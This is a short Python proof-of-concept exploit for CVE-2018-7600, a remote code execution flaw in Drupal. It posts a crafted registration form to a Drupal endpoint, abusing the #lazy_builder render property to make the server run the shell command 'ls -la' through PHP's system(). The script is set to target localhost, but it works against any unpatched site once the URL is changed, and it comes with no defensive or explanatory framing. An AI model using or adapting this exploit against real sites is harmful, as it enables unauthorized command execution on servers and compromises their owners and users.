#!/usr/bin/env python3
import urllib.request
import urllib.parse

print ('################################################################')
print ('# PoC for CVE-2018-7600')
print ('# by Jyozi')
print ('################################################################')

server_url = "http://127.0.0.1/"

url = server_url + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'system', 'mail["a"][#lazy_builder][1][]': 'ls -la'}
data = urllib.parse.urlencode(payload).encode('utf-8')

try :
    request = urllib.request.Request(url, data)
    response = urllib.request.urlopen(request)
except urllib.error.HTTPError as e:
    response = e.read()
    print(response.decode('utf-8'))

